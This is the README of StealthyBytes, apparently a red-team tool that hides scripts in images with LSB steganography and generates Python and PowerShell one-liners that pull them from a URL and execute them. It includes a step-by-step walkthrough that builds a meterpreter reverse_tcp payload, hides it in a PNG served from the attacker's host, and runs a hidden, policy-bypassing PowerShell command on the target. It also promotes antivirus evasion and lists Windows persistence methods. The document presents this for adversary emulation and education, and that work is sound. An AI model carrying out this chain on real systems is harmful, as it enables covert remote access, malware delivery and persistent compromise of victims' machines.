# StealthyBytes

StealthyBytes originated during the development of the book ["Adversary Emulation with ATT&CK™"](https://www.oreilly.com/library/view/adversary-emulation-with/9781098143756/), inspired by the strategies and behaviors characteristic of sophisticated Advanced Persistent Threat (APT) groups. This tool aims to replicate these groups' effective techniques, focusing on stealth and persistence. 

It conceals content into images by applying the Least Significant Bit (LSB) steganography. The LSB is the bit in each set with the lowest value, meaning its alteration affects the color value the least and is thus the least noticeable to the human eye. By modifying these bits, LSB steganography allows for embedding information directly into an image with minimal impact on the visual appearance. StealthyBytes is aligned with the principles outlined in the MITRE ATT&CK Technique ID [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information), underscoring its utility in illustrating and applying advanced obfuscation techniques. APTs have increasingly utilized LSB techniques to hide malware within seemingly harmless digital images. This technique is particularly effective for initiating and maintaining long-term espionage or sabotage operations, aligning with the typical objectives of an advanced threat actor. 

## Key Features

- **Content Embedding with LSB Steganography**: Covertly embed any script into an image file using the Least Significant Bit (LSB) technique, subtly altering pixel data to encode scripts in a nearly undetectable manner.

- **Advanced Extraction**: Extract embedded content from image files or through remote image sources.

- **One-Liner Command Generation for Python and PowerShell**: Generate concise one-liner commands in both Python and PowerShell to facilitate quick extraction and execution of scripts from images.

- **Remote Image Handling**: Process images from URLs, extending functionality to web-hosted images for broader testing scenarios.

- **Error Handling and Logging**: Equipped with error handling and detailed logging for enhanced troubleshooting and performance monitoring.

- **Base64 Encoding for Command Obfuscation**: Generate Base64-encoded versions of Python and PowerShell one-liners for an added layer of obfuscation.

## Usage

The following section outlines the practical application of StealthyBytes, guiding through its core functionalities. Each step is detailed, from embedding scripts in images to extracting and executing them.

```bash
python3 StealthyBytes.py --help
usage: StealthyBytes.py [-h] -m {embed,extract,one_liner} [-s SCRIPT] [-o OUTPUT] [-i IMAGE] [-u URL] [--string STRING] [--show] [--base64] [--powershell] [--python]
                        [--auto-create-image]

Embed or Extract a script in/from an image file.

optional arguments:
  -h, --help            show this help message and exit
  -m {embed,extract,one_liner}, --mode {embed,extract,one_liner}
                        Operation mode: embed, extract, or one_liner.
  -s SCRIPT, --script SCRIPT
                        Path to the script file for embedding.
  -o OUTPUT, --output OUTPUT
                        Path to save the output image or extract the script to.
  -i IMAGE, --image IMAGE
                        Path to the input image for embedding or extraction.
  -u URL, --url URL     URL of the web image for extraction or one-liner generation.
  --string STRING       Direct string input for embedding in the image.
  --show                Display extracted script content in the terminal.
  --base64              Encode the one-liner in base64.
  --powershell          Generate the one-liner in PowerShell.
  --python              Generate the one-liner in Python.
  --auto-create-image   Automatically create a new image if the existing one is too small.
```

### Embedding and Extracting 
The embedding command allows the integration of content into image files to understand and develop counter-strategies against complex steganographic methods. Conversely, the extraction command is valuable for those delving into analyzing obfuscated data, whether embedded in local or remotely hosted content.

Embedding Content into an Image

```bash
python3 StealthyBytes.py --mode embed --script <script> --image <image> --output <output> [--auto-create-image ]
python3 StealthyBytes.py --mode embed --string <string> --image <image> --output <output> [--auto-create-image ]
```

Extracting Content from an Image or URL

```bash
python3 StealthyBytes.py --mode extract --url <url> --output <script> [--show]
python3 StealthyBytes.py --mode extract --image <image> --output <script> [--show]
```

### Generating a One-Liner

The `one-liner` feature in StealthyBytes, especially when paired with the `--url` option, enhances its ability to perform in-memory attacks and discreetly deploy files malware. Utilizing this module to extract and execute scripts from remotely hosted images enables direct command execution from an external source. Likewise, embedding it within PNG images still adds an element of stealth because antivirus programs typically do not flag PNG files as high-risk for command execution; as such, hidden malicious code will remain undetected in initial security scans. 

One_liner from Local Image:

```bash
python3 StealthyBytes.py --mode one_liner --image <image> --python [--base64]
python3 StealthyBytes.py --mode one_liner --image <image> --powershell [--base64]
```

One_liner from Remote Image URL

```bash
python3 StealthyBytes.py --mode one_liner --url <url> --python [--base64]
python3 StealthyBytes.py --mode one_liner --url <url> --powershell [--base64]
```

### Secret Messaging
Transform ordinary images into carriers of secret messages with StealthyBytes. Whether it's covertly planning a surprise party or sharing inside jokes, your ideas can now hold text messages that only you and your buddies can decode. Just embed, send, and let the intrigue unfold!

- **Embed a Secret**: `python3 StealthyBytes.py --mode embed --string "Your secret message" --image cool_pic.jpg --output secret_pic.png`
- **Reveal the Hidden**: `python3 StealthyBytes.py --mode extract --image secret_pic.png --show`

## Installation and Requirements

Looking ahead, the future development roadmap for StealthyBytes is focused on enhancing its universality and ease of use across various systems. A key objective is eliminating the dependency on external libraries, transitioning towards using only built-in libraries available in standard Python distributions. This strategic shift aims to ensure that StealthyBytes can run seamlessly on any system without the prerequisite of pre-installing additional libraries. 

- Python 3.x
- Pillow (Python Imaging Library Fork)

Downloading and install the necessary libraries using:

```bash
git clone https://github.com/drinorselmanaj/StealthyBytes
cd StealthyBytes
pythhon3 -m pip install -r requirements.txt
```

## Practical Use Cases

In this example, we demonstrate how StealthyBytes can be used in a real-world scenario for embedding and executing a script from a remote image using a reverse TCP payload.

Create a simple payload using `msfvenom` (It can be any Python or Powershell payload):

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.171 lport=1405 -f psh -o msf.ps1
```

Embed `msf.ps1` into an image:

```bash
python3 StealthyBytes.py --mode embed --script msf.py --image unarmed.jpg --output armed.png --powershell --base64
```

Initiate an `HTTP Server` to host the image (or it can be any online service that provides direct access to image resources):

```bash
python3 -m http.server 80
```

Set-up the handler for the reverse TCP connection:

```bash
handler -p windows/meterpreter/reverse_tcp -P 1405 -H 192.168.1.171
[*] Started reverse TCP handler on 192.168.1.171:1405 
```

Generate a one-liner command to extract and execute the script from the remotely hosted image:

```bash
python3 StealthyBytes.py --mode one_liner --url http://192.168.1.171/angle.png --powershell
```

Once the one-liner command is generated, execute it on the target system:

```bash
powershell.exe -noni -noexit -ep bypass -w hidden -e BASE64_ENCODED_STRING
```

Replace 'BASE64_ENCODED_STRING' with the actual base64 encoded string from StealthyBytes. To gain immediate access, simply execute the crafted PowerShell command in the Command Prompt.

### Techniques for Establishing Persistence with StealthyBytes:

For those aiming to achieve persistence to maintain long-term access to a system, integrating StealthyBytes' `one_liner` into various persistence mechanisms is straightforward. 

- **Registry Keys**: 
  - **MITRE ATT&CK ID**: [T1547.001](https://attack.mitre.org/techniques/T1547/001/)
  - **Description**: Embed the command in registry keys configured to execute commands upon system startup, ensuring automatic execution each time the system boots up.

- **Scheduled Tasks**: 
  - **MITRE ATT&CK ID**: [T1053.005](https://attack.mitre.org/techniques/T1053/005/)
  - **Description**: Create a scheduled task within the Windows Task Scheduler to run the command either at system startup or at regular intervals for consistent, timed execution.

- **Startup Folder**: 
  - **MITRE ATT&CK ID**: [T1547.001](https://attack.mitre.org/techniques/T1547/001/)
  - **Description**: Place a shortcut to a script or batch file containing the command in the Windows startup folder to ensure execution every time a user logs into the system.

- **Windows Service**: 
  - **MITRE ATT&CK ID**: [T1543.002](https://attack.mitre.org/techniques/T1543/002/)
  - **Description**: Establish a Windows service that executes the command, particularly effective in environments with higher privileges and offers a more stealthy approach to persistence.

## StealthyBytes Starter Challenge

This challenge is designed as an engaging and practical way to start with StealthyBytes. It's the perfect opportunity to familiarize yourself with the tool's fundamental capabilities. Your task is to use StealthyBytes to extract a hidden message from `images/armed.png`. Successfully disclosing this message signifies that you are ready to explore more advanced applications of StealthyBytes in your home lab. Now, it is time to explore and uncover the secrets hidden in plain sight!

## Compliance and Disclaimer

StealthyBytes is developed for educational and ethical purposes only. Adherence to all relevant legal and ethical standards is required. The developers of StealthyBytes disclaim responsibility for any misuse or resultant damage.

**Educational Note**: This tool references the MITRE ATT&CK framework, a globally recognized knowledge base for understanding cyber threats and defenses. 
